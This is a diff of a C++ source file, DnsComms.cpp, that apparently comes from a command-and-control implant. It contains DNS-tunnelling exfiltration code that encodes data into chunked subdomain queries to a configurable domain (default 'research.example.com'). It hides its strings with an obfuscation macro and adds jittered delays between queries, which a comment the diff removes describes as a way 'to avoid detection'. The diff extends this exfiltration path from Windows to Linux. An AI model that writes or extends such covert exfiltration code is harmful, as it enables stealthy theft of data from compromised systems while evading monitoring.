@@ -1,4 +1,3 @@
-// src/communication/DnsComms.cpp
 #include "communication/DnsComms.h"
 #include "core/Logger.h"
 #include "core/Configuration.h"
@@ -6,14 +5,10 @@
 #include "utils/StringUtils.h"
 #include "utils/NetworkUtils.h"
 #include "utils/TimeUtils.h"
-#include <windows.h>
-#include <windns.h>
 #include <vector>
 #include <sstream>
 #include <cstdint>
 #include <string>
-
-#pragma comment(lib, "dnsapi.lib")
 
 // Obfuscated strings
 static const auto OBF_DNS_COMMS = OBFUSCATE("DnsComms");
@@ -44,10 +39,18 @@ bool DnsComms::SendData(const std::vector<uint8_t>& data) {
         chunks.push_back(encodedData.substr(i, 50));
     }
 
+#if PLATFORM_WINDOWS
+    return SendDataWindows(chunks);
+#elif PLATFORM_LINUX
+    return SendDataLinux(chunks);
+#endif
+}
+
+bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) const {
+#if PLATFORM_WINDOWS
     bool overallSuccess = true;
     
     for (const auto& chunk : chunks) {
-        // Create DNS query with data as subdomain
         std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
         
         DNS_STATUS status = DnsQuery_A(
@@ -64,11 +67,36 @@ bool DnsComms::SendData(const std::vector<uint8_t>& data) {
             overallSuccess = false;
         }
 
-        // Add delay between queries to avoid detection
         utils::TimeUtils::JitterSleep(100, 0.3);
     }
 
     return overallSuccess;
+#else
+    return false;
+#endif
+}
+
+bool DnsComms::SendDataLinux(const std::vector<std::string>& chunks) const {
+#if PLATFORM_LINUX
+    bool overallSuccess = true;
+    
+    for (const auto& chunk : chunks) {
+        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
+        
+        // Use Linux DNS resolution (simplified)
+        struct hostent* host = gethostbyname(query.c_str());
+        if (!host) {
+            LOG_DEBUG("DNS query failed for: " + query);
+            overallSuccess = false;
+        }
+
+        utils::TimeUtils::JitterSleep(100, 0.3);
+    }
+
+    return overallSuccess;
+#else
+    return false;
+#endif
 }
 
 void DnsComms::Cleanup() {
@@ -76,11 +104,19 @@ void DnsComms::Cleanup() {
 }
 
 bool DnsComms::TestConnection() const {
-    // Test DNS resolution
+#if PLATFORM_WINDOWS
+    return TestConnectionWindows();
+#elif PLATFORM_LINUX
+    return TestConnectionLinux();
+#endif
+}
+
+bool DnsComms::TestConnectionWindows() const {
+#if PLATFORM_WINDOWS
     PDNS_RECORD dnsRecord;
     DNS_STATUS status = DnsQuery_A(
         "google.com",
-        DNS_TYPE_A,
+        DNS_TYPE_A, 
         DNS_QUERY_STANDARD,
         NULL,
         &dnsRecord,
@@ -93,6 +129,18 @@ bool DnsComms::TestConnection() const {
     }
     
     return false;
+#else
+    return false;
+#endif
+}
+
+bool DnsComms::TestConnectionLinux() const {
+#if PLATFORM_LINUX
+    struct hostent* host = gethostbyname("google.com");
+    return host != nullptr;
+#else
+    return false;
+#endif
 }
 
 std::vector<uint8_t> DnsComms::ReceiveData() {
